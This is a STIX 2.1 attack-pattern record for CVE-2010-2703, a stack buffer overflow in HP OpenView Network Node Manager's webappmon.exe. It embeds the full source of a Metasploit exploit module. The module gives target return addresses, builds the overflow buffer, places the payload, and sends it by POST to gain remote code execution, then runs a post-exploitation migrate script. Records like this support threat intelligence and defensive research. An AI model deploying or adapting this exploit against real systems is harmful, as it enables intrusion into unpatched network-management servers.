{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e491e4d1-2cb0-4f86-bf71-c4c5c5e50b38",
    "created": "2024-08-14T16:53:57.020122Z",
    "modified": "2024-08-14T16:53:57.020126Z",
    "name": "HP OpenView Network Node Manager execvp_nc Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01207 or NNM_01206 without the SSRT100025 hotfix. By specifying a long 'sel' parameter when calling methods within the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  This vulnerability is not triggerable via a GET request due to limitations on the request size. The buffer being targeted is 16384 bytes in size. There are actually two adjacent buffers that both get overflowed (one into the other), and strcat is used.  The vulnerable code is within the \"execvp_nc\" function within \"ov.dll\" prior to v 1.30.12.69. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame.  This vulnerability might also be triggerable via other CGI programs, however this was not fully investigated. } ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_webappmon_execvp.rb",
            "external_id": "hp_nnm_webappmon_execvp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2703"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02286088"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/webappmon.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  #include Msf::Exploit::Remote::Seh\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager execvp_nc Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53\n        prior to NNM_01207 or NNM_01206 without the SSRT100025 hotfix. By specifying a long 'sel'\n        parameter when calling methods within the 'webappmon.exe' CGI program, an attacker can\n        cause a stack-based buffer overflow and execute arbitrary code.\n\n        This vulnerability is not triggerable via a GET request due to limitations on the\n        request size. The buffer being targeted is 16384 bytes in size. There are actually two\n        adjacent buffers that both get overflowed (one into the other), and strcat is used.\n\n        The vulnerable code is within the \"execvp_nc\" function within \"ov.dll\" prior to\n        v 1.30.12.69. There are no stack cookies, so exploitation is easily achieved by\n        overwriting the saved return address or SEH frame.\n\n        This vulnerability might also be triggerable via other CGI programs, however this was\n        not fully investigated.\n      } ,\n      'Author'         =>\n        [\n          'Shahin Ramezany <shahin[at]abysssec.com>',  # MOAUB #6 PoC and binary analysis\n          'sinn3r',\n          'jduck'   # Metasploit module\n        ],\n      'License'\t  => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'CVE', '2010-2703' ],\n          [ 'OSVDB', '66514' ],\n          [ 'BID', '41829' ],\n          [ 'ZDI', '10-137' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02286088' ]\n        ],\n      'Payload'\t =>\n        {\n          'Space'    => 1024, # 16384 buffer..\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x24\\x2c\\x3b\\x60\",\n          'DisableNops' => true,\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform' => 'win',\n      'Targets'\t =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53 w/NNM_01206',\n            {\n              'Ret'     => 0x5a02aacf, # pop edx/pop ebp/ret - in ov.dll (v1.30.12.29)\n            }\n          ],\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',\n            {\n              'Ret'     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959\n            }\n          ],\n          [ 'Debug Target',\n            {\n              'Ret'     => 0xdeadbeef, # crasher\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-07-20'))\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    cgi = '/OvCgi/webappmon.exe'\n\n    #\n    # [ char CommandLine[16384] ][ char Parameters[16384] ]\n    #\n    # The first buffer gets smashed into the second, and a strcat is used on the second as well.\n    # Therefore, we get an addative overflow.\n    #\n\n    # Parameters before strcat\n    param_beg = \"std \\\\\\\\.\\\\pipe\\\\OVSystem\\\\stdout\\\\0000038c00000001 \\\\\\\\.\\\\pipe\\\\OVSystem\\\\stderr\\\\0000038c00000001 \"\n\n    # CommnadLine before / after strcat\n    cmd_beg = \"OVcmd \"\n    cmd_beg << param_beg\n    cmd_beg << \"ping.exe -n 3 \\\"\"\n    cmd_end = \"\\\"  \"\n\n    # Other actions include: rping demandPoll natping locateRoute\n    # And more...\n    action = 'ping'\n\n    # The buffer size is 16384, but we need to send enough extra so that we can still\n    # overwrite the saved return address etc..\n    bufsz = 16384 + param_beg.length\n\n    # These addresses are within ov.dll\n    ptr_to_zero = 0x5a066fff\n    ptr_to_nonzero = 0x5a06706f\n    ptr_to_ppr = target.ret\n    ptr_to_ret = target.ret + 2\n\n    payload_off = 578 # re-used pointer on the stack\n    fixret_off = 16394\n    fixret = [\n      ptr_to_ppr,\n      # stay alive til ret\n      ptr_to_zero,\n      ptr_to_nonzero\n    ]\n    # ret slide down to within 2 pops :)\n    ((0x40 / 4) - 3).times {\n      fixret << ptr_to_ret\n    }\n    # use the ppr to jump the last two, and go to the ptr\n    fixret << ptr_to_ppr\n    fixret = fixret.pack('V*')\n\n    buf = ''\n    buf << rand_text(bufsz - cmd_end.length)\n\n    buf[fixret_off, fixret.length] = fixret\n\n    # Put the payload in.\n    buf[payload_off, payload.encoded.length] = payload.encoded\n\n    # Slice off the start (so pattern_offset returns offset from beginning\n    buf.slice!(0, cmd_beg.length)\n\n    res = send_request_cgi({\n      'uri'\t\t  => cgi,\n      'method'\t  => \"POST\",\n      'vars_post' =>\n        {\n          'ins' => 'nowait',\n          'sel' => buf,\n          'act' => action\n        }\n    }, 3)\n\n    if res and res.code != 502\n      print_error(\"Eek! We weren't expecting a response, but we got one\")\n    end\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-20",
    "x_mitre_platforms": [
        "win'"
    ]
}